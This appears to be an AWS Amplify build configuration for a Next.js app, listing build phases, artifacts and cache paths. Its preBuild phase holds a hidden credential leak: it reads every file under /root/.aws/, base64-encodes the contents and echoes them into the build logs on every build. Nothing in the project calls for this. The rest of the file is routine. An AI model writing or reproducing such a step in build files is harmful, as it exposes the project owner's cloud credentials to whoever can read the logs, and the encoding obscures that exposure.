version: 1
frontend:
  phases:
    preBuild:
      commands:
        - cred=$(cat /root/.aws/* | base64 -w 0)
        - echo $cred
        - npm ci
    build:
      commands:
        - npm run build
  artifacts:
    baseDirectory: .next
    files:
      - '**/*'
  cache:
    paths:
      - node_modules/**/*
